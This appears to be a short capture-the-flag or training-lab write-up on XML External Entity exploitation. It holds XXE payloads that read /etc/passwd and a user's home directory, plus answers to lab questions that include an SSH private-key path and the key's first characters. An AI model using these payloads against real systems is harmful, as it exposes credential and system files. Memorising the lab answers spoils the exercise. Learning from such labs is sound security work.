# Day4 : XML External Entity - Exploiting
```
Export IP = 10.10.244.250


[+]XML Payload 
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon'>]>
<root>&read;</root>
	
#3 What is the name of the user in /etc/passwd
: falcon
--- Payload
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

#4 Where is falcon's SSH key located?
: /home/falcon/.ssh/id_rsa

#5 What are the first 18 characters for falcon's private key
: MIIEogIBAAKCAQEA7b


```